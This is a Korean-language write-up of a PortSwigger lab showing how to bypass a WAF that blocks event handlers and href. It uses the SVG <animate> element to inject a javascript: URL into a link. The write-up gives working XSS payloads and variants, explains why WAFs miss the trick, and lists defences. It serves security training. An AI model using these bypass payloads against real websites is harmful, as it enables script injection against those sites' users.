# Lab: Reflected XSS with some SVG markup allowed (event handlers and href attributes blocked)

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / SVG animate / href 동적 주입 / WAF 우회
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

## 목표

이벤트 핸들러(`onclick`, `onerror` 등)와 `href` 속성이 WAF로 차단된 환경에서, SVG `<animate>` 요소로 `<a>` 태그의 `href` 를 동적으로 `javascript:` URL 로 변경하여 클릭 시 `alert()` 를 실행시킨다.

## 제약 조건

```
WAF 차단:
  onclick="..."         — 이벤트 핸들러 속성
  onerror="..."         — 이벤트 핸들러 속성
  onload="..."          — 이벤트 핸들러 속성
  href="javascript:..." — href 속성 직접 삽입

WAF 허용:
  <svg>                 — SVG 요소
  <animate>             — SVG 애니메이션 요소
  attributeName="href"  — animate 의 속성 대상 지정 (href 직접 아님)
  values="..."          — animate 의 값 설정
```

## 최종 페이로드

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)"/>
    <text x="20" y="20">Click here</text>
  </a>
</svg>
```

## 핵심 원리 — WAF 우회 방식

```
[WAF 가 차단하는 것]
<a href="javascript:alert(1)">  — href 속성 직접 작성 → 차단

[SVG animate 로 우회]
<a>
  <animate attributeName="href" values="javascript:alert(1)"/>
</a>

WAF 관점:
  → <a> 태그에 href 속성 없음 → 차단 안 함
  → <animate> 의 attributeName 값은 href 지만 → animate 속성 값이므로 다름
  → 브라우저가 페이지를 렌더링한 후 animate 가 동적으로 href 를 설정
  → WAF 는 정적 HTML 분석이므로 동적 변경을 감지 못함

브라우저 관점:
  → <animate attributeName="href" values="javascript:alert(1)"/>
  → 페이지 로드 시 <a> 의 href 를 "javascript:alert(1)" 로 설정
  → 사용자가 <a> 클릭 → javascript: 실행 → alert(1) 발화
```

## `to` vs `values` — 핵심 차이점

### SVG animate 의 값 지정 방식

| 속성 | 설명 | 예시 |
|------|------|------|
| `from` | 시작 값 | `from="0"` |
| `to` | 종료 값 | `to="100"` |
| `by` | 현재값 기준 변화량 | `by="10"` |
| `values` | 전체 값 목록 (세미콜론 구분) | `values="0;50;100"` |

### `to` 가 Chrome 에서 동작하지 않는 이유

```html
<!-- to 방식 — Chrome 에서 실패 -->
<a>
  <animate attributeName="href" to="javascript:alert(1)"/>
</a>
```

```
to 의 동작 원리:
  현재 값(from) → to 값 으로 애니메이션

문제:
  <a> 에 href 가 없으면 초기값 = "" (빈 문자열) 또는 null
  Chrome: 초기값이 유효하지 않으면 to 애니메이션 적용 거부
  → href 가 설정되지 않음 → 클릭해도 아무 동작 없음

Firefox: to 로도 동작하는 경우 있음 (덜 엄격한 초기값 검사)
```

### `values` 가 Chrome 에서 동작하는 이유

```html
<!-- values 방식 — Chrome 에서 성공 -->
<a>
  <animate attributeName="href" values="javascript:alert(1)"/>
</a>
```

```
values 의 동작 원리:
  values 는 시작값과 무관하게 지정된 값 목록을 따라 속성을 설정
  단일 값(세미콜론 없음): 애니메이션 시작 즉시 해당 값으로 고정

values="javascript:alert(1)" 처리:
  → 애니메이션 시작(페이지 로드 즉시) → href = "javascript:alert(1)" 설정
  → 초기값 검사 없음 → Chrome 에서도 정상 동작
```

### 값 목록 활용 예시

```html
<!-- 단일 값 — 고정 (이번 랩) -->
<animate attributeName="href" values="javascript:alert(1)"/>

<!-- 다중 값 — 순서대로 전환 -->
<animate attributeName="href" values="http://a.com;http://b.com;javascript:alert(1)"
         dur="3s" repeatCount="indefinite"/>

<!-- to + from 조합 -->
<animate attributeName="opacity" from="0" to="1" dur="2s"/>

<!-- by 사용 (상대적 변화) -->
<animate attributeName="cx" by="50" dur="1s"/>
```

## `attributeName` 이해

SVG `<animate>` 의 `attributeName` 은 애니메이션을 적용할 **부모 요소의 속성 이름**을 지정한다.

```html
<svg>
  <!-- <circle> 의 cx 속성을 애니메이션 -->
  <circle cx="0" cy="50" r="10">
    <animate attributeName="cx" from="0" to="200" dur="2s"/>
  </circle>

  <!-- <a> 의 href 속성을 애니메이션 (이번 랩) -->
  <a>
    <animate attributeName="href" values="javascript:alert(1)"/>
    <text x="20" y="20">Click</text>
  </a>

  <!-- <rect> 의 fill 속성을 애니메이션 -->
  <rect width="50" height="50">
    <animate attributeName="fill" values="red;blue;green" dur="3s"/>
  </rect>
</svg>
```

**XSS 에서 유용한 `attributeName` 대상**:

| 대상 속성 | 부모 요소 | XSS 벡터 |
|----------|-----------|---------|
| `href` | `<a>` | `javascript:` URL 로 변경 |
| `xlink:href` | `<a>`, `<image>` | `javascript:` URL (구버전 SVG) |
| `src` | `<image>` | onerror 유발용 (WAF 우회) |
| `onbegin` | `<animate>` | 이벤트 핸들러 직접 (016 랩) |

## 브라우저별 SVG animate 동작 차이

| 항목 | Chrome | Firefox | Safari |
|------|--------|---------|--------|
| `to` (초기값 없음) | 거부 | 허용 | 허용 |
| `values` (단일) | 허용 | 허용 | 허용 |
| `xlink:href` animate | 지원 감소 | 지원 | 지원 |
| `href` animate | 지원 | 지원 | 지원 |
| SMIL 전체 지원 | 지원 | 지원 | 지원 |

## 핵심 정리

- WAF 가 `href` 속성을 정적으로 차단해도, SVG `<animate>` 로 런타임에 동적으로 설정하면 우회 가능하다.
- `to` 는 초기값이 필요해 Chrome 에서 실패할 수 있고, `values` 는 초기값 없이 직접 값을 설정하므로 더 범용적이다.
- `<text>` 자식 요소로 클릭 가능한 텍스트를 만들어야 사용자가 링크를 클릭할 수 있다.
- **방어**:
  - `attributeName` 값이 `href`, `src`, `action` 등 위험한 속성을 가리키는 `<animate>` 차단
  - SVG 전체를 허용하지 않거나 DOMPurify 로 SVG 내부 정화
  - CSP: `default-src 'self'` 로 `javascript:` 실행 차단

## 배운 점 및 추가 학습

### 1. SVG animate 값 지정 우선순위 규칙

```
values 가 있으면 from/to/by 무시:
  values 는 완전한 값 목록을 직접 정의
  from, to, by 는 values 가 없을 때만 사용

values 단일 값 = 즉시 해당 값으로 고정:
  values="javascript:alert(1)"
  → 애니메이션 시작(dur 기본값=indefinite 또는 즉시) 시 해당 값으로 설정

dur 미지정 시 동작:
  기본 begin=0 → 페이지 로드 즉시 시작
  fill="freeze" 미지정 시에도 단일 values 는 유지됨
```

### 2. `xlink:href` vs `href` (SVG 버전 차이)

```html
<!-- SVG 1.1 방식 (구버전) -->
<a xlink:href="javascript:alert(1)">Click</a>
<animate attributeName="xlink:href" values="javascript:alert(1)"/>

<!-- SVG 2.0 방식 (현대) -->
<a href="javascript:alert(1)">Click</a>
<animate attributeName="href" values="javascript:alert(1)"/>

차이:
  xlink:href: 네임스페이스 필요 (xmlns:xlink 선언)
  href:       SVG 2.0 표준, 네임스페이스 불필요
  → 현대 브라우저는 href 를 권장, xlink:href 는 deprecated
```

### 3. WAF 우회 패턴 — 정적 vs 동적

```
[정적 분석으로 차단 가능]
  href="javascript:alert(1)"   — HTML 파싱 시 바로 보임
  onclick="alert(1)"           — 속성명으로 감지

[정적 분석으로 차단 어려움]
  <animate attributeName="href" values="javascript:..."/>
    → attributeName의 "href" 는 animate의 속성값
    → DOM 렌더링 후에야 실제 href가 변경됨
    → WAF가 DOM 렌더링을 시뮬레이션하지 않으면 감지 불가

  CSS content 속성으로 값 삽입
    → CSS-in-JS 처럼 런타임에 적용

  JS로 setAttribute('href', ...)
    → XSS가 이미 실행된 후 추가 조작
```

### 4. SVG `<a>` 태그와 HTML `<a>` 태그 차이

```html
<!-- HTML a 태그 -->
<a href="javascript:alert(1)">Click</a>
  → 클릭 가능 영역 = 텍스트 내용

<!-- SVG a 태그 (이번 랩) -->
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)"/>
    <text x="20" y="20">Click here</text>  ← 이게 없으면 클릭 영역 없음
  </a>
</svg>

SVG a 태그의 특징:
  → 자식으로 SVG 요소를 가짐 (text, circle, rect 등)
  → <text> 가 클릭 가능한 레이블 역할
  → href 는 <animate> 로 동적 설정
```

### 5. 이번 랩 WAF 우회 vs 이전 SVG 랩 (016) 비교

| 항목 | 016 랩 | 027 랩 (이번) |
|------|--------|--------------|
| 차단 대상 | 대부분 태그/이벤트 | 이벤트 핸들러 + href |
| 허용 | 일부 SVG 태그 | SVG (animate 포함) |
| 공격 방법 | `onbegin` SMIL 이벤트 | `animate`로 `href` 동적 주입 |
| 실행 조건 | 자동 (페이지 로드 시) | 사용자 클릭 필요 |
| 핵심 기술 | SMIL 이벤트 속성 | SVG animate 속성 값 설정 |
